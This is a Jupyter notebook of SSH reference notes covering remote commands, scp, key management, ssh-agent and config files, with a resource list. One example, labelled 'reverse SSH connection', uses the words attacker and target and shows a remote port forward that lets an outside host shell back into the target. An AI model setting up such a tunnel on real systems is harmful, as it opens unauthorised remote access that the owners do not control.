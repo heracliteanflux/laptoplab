{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# SSH\n",
    "Secure Shell"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Table of Contents\n",
    "```{contents}\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Commands Reference"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Remote Ops"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**`ssh`** \"secure shell\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "options\n",
    "* `-R` enables remote port forwarding"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "[example]\n",
    "\n",
    "Run command `ps` on the remote machine `myserver`.\n",
    "\n",
    "```bash\n",
    "ssh myserver ps\n",
    "ssh username@myserver ps       # specify user name\n",
    "ssh -l username myserver ps    # specify user name\n",
    "ssh -p 22 myserver ps          # specify port number\n",
    "ssh myserver ps > /tmp/ps.out  # redirect the output to a file on your local system\n",
    "ssh myserver ps \\> /tmp/ps.out # redirect the output to a file on the remote system\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "[example]\n",
    "\n",
    "Run a script remotely.\n",
    "\n",
    "```bash\n",
    "ssh myserver bash < ./myscript.sh\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "[example]\n",
    "\n",
    "test version with leading `echo`\n",
    "\n",
    "```bash\n",
    "for node in web-server{00..09}; do\n",
    "  echo ssh $node 'echo -e \"$HOSTNAME\\t$(date \"+%F\") $(uptime)\"'\n",
    "done\n",
    "```\n",
    "\n",
    "ready version\n",
    "\n",
    "```bash\n",
    "for node in web-server{00..09}; do\n",
    "  ssh $node 'echo -e \"$HOSTNAME\\t$(date \"+%F\") $(uptime)\"'\n",
    "done\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "[example]\n",
    "\n",
    "wait for a reboot\n",
    "\n",
    "```bash\n",
    "until ssh user@10.10.10.10; do sleep 3; done\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "[example]\n",
    "\n",
    "reverse SSH connection\n",
    "* `12345` is the port number that the remote system (the attacker) will use to SSH back into the target\n",
    "* `localhost:22` specifies the port number that the target system will listen on to receive a connection\n",
    "\n",
    "```bash\n",
    "ssh -R 12345:localhost:22 user@remoteipaddress\n",
    "```\n",
    "```bash\n",
    "ssh localhost -p 12345 # setup a reverse connection from the attacker system after the target has connected\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**`scp`** \"secure copy\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "[example]\n",
    "\n",
    "Upload the file `some_system.tar.gz` to the home directory of user `bob` on remote system `10.0.0.45`.\n",
    "\n",
    "```bash\n",
    "scp some_system.tar.gz bob@10.0.0.45:/home/bob/some_system.tar.gz\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "https://www.linuxfoundation.org/blog/blog/classic-sysadmin-how-to-securely-transfer-files-between-servers-with-scp"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**`sftp`** \"secure file transfer protocol\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Key Management"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "* `ssh-add`\n",
    "  * `ssh-add --apple-use-keychain ~/.ssh/id_ed25519`\n",
    "  * `ssh-add -l` list private keys currently accessible to ssh-agent\n",
    "* `ssh-keysign`\n",
    "* `ssh-keyscan`\n",
    "* `ssh-keygen`\n",
    "  * `ssh-keygen -f ~/.ssh/id_ed25519 -t ed25519 -C \"email@example.com\"`"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Service"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "* `sshd`\n",
    "* `sftp-server`\n",
    "* `ssh-agent`\n",
    "  * `eval \"$(ssh-agent -s)\"`\n",
    "  * `echo $SSH_AGENT_PID`\n",
    "  * `echo $SSH_AUTH_SOCK`"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "`ssh-copy-id`\n",
    "* `ssh-copy-id -i ~/.ssh/id_ed25519 user@host`\n",
    "\n",
    "OpenSSH Files\n",
    "\n",
    "`~/.ssh/authorized_keys`\n",
    "\n",
    "`~/.ssh/known_hosts`\n",
    "\n",
    "`~/.ssh/config`\n",
    "\n",
    "```\n",
    "Host github.com\n",
    "  AddKeysToAgent yes\n",
    "  Hostname       github.com\n",
    "  IdentityAgent  \n",
    "  IdentityFile   ~/.ssh/id_ed25519\n",
    "  UseKeychain    yes\n",
    "  User           git\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Resources"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "[ [h](https://www.openssh.com/) ][ [w](https://en.wikipedia.org/wiki/OpenSSH) ] OpenSSH\n",
    "\n",
    "Tools\n",
    "* clusterssh - Written in Perl, it opens a bunch of unmanaged terminals in windows.\n",
    "* mssh (MultiSSH) - GTK+–based multi-SSH client in a single GUI window.\n",
    "* mussh - MUltihost SSH Wrapper shell script.\n",
    "* pconsole - Intended for tiling window managers, spawns a terminal per host.\n",
    "* multixterm - Written in Expect & Tk, drives multiple xterms.\n",
    "* PAC Manager - A Perl SecureCRT-like GUI on Linux.\n",
    "\n",
    "Youtube\n",
    "* [ [y](https://www.youtube.com/watch?v=sBrAVQumqjs) ] `11-14-2022`. LearnLinuxTV. \"5 Must Have Tweaks to Secure OpenSSH\".\n",
    "* [ [y](https://www.youtube.com/watch?v=v2ii8kdXCic) ] `03-23-2022`. LearnLinuxTV. \"Speed Up Your SSH Sessions with These Seven Quick SSH Config Tricks\".\n",
    "* [ [y](https://www.youtube.com/watch?v=GxRu35fy-oY) ] `01-10-2022`. LearnLinuxTV. \"Getting Started with OpenSSH Key Management\".\n",
    "* [ [y](https://www.youtube.com/watch?v=MWqfc_fegVg) ] `11-18-2021`. LearnLinuxTV. \"The OpenSSH Client Config File: Simplify your SSH Connections\".\n",
    "* [ [y](https://www.youtube.com/watch?v=YS5Zh7KExvE) ] `12-18-2020`. LearnLinuxTV. \"OpenSSH Full Guide - Everything you need to get started!\".\n",
    "* [ [y](https://www.youtube.com/watch?v=7OQYlLh0srY) ] `10-21-2019`. LearnLinuxTV. \"Linux Commands for Beginners 22 - Remote Management with OpenSSH\".\n",
    "* [ [y](https://www.youtube.com/watch?v=pE3EuiyShoM) ] `02-23-2022`. Linode. \"How to use Multiple SSH Keys | Managing Different SSH Keys on your System\".\n",
    "\n",
    "[ [y](https://www.youtube.com/watch?v=vV_WdTBbww4) ] `04-03-2024`. Low Level Learning. \"revealing the features of the XZ backdoor\".\n",
    "\n",
    "More\n",
    "* https://www.ssh.com/\n",
    "  * https://www.ssh.com/academy/ssh/port\n",
    "* https://help.ubuntu.com/community/SSH/OpenSSH/Keys"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Texts"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "* [ [h](http://www.snailbook.com/index.html) ] Barrett, Daniel J.; Richard E. Silverman; & Robert G. Byrnes. (2005). _SSH The Secure Shell: The Definitive Guide_. 2nd Ed. O'Reilly."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Terms"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "* [ w ] Host Key (authenticates computer)\n",
    "* [ w ] Identity Key (authenticates user)\n",
    "* [ [w](https://en.wikipedia.org/wiki/OpenSSH) ] OpenSSH\n",
    "* [ [w](https://en.wikipedia.org/wiki/PuTTY) ] PuTTY\n",
    "* [ [w](https://en.wikipedia.org/wiki/SSH_File_Transfer_Protocol) ] SFTP Secure File Transfer Protocol\n",
    "* [ [w](https://en.wikipedia.org/wiki/Secure_Shell) ] SSH Secure Shell\n",
    "* [ [w](https://en.wikipedia.org/wiki/Comparison_of_SSH_clients) ] SSH Client\n",
    "* [ [w](https://en.wikipedia.org/wiki/Comparison_of_SSH_servers) ] SSH Server\n",
    "* [ [w](https://en.wikipedia.org/wiki/Telnet) ] Telnet"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---"
   ]
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
